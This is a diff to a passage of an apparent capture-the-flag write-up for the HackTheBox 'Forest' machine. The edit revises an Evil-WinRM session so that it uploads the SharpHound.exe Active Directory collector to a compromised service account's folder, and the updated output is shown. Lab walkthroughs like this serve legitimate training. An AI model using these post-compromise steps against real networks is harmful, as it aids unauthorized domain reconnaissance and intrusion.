@@ -122,11 +122,13 @@ Archive:  SharpHound_v2.6.7_windows_x86.zip
   inflating: SharpHound.ps1          
 ```
 
-Uploaded the `.exe` to the machine.
+Uploaded `SharpHound.exe` to the machine.
 ```powershell
-*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload sharphound.zip
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload SharpHound.exe
                                         
-Info: Uploading /home/wither/CTF/HTB/Forest/files/sharphound.zip to C:\Users\svc-alfresco\Documents\sharphound.zip
+Info: Uploading /home/wither/CTF/HTB/Forest/files/SharpHound.exe to C:\Users\svc-alfresco\Documents\SharpHound.exe
+                                        
+Data: 1715540 bytes of 1715540 bytes copied
                                         
 Info: Upload successful!
 ```
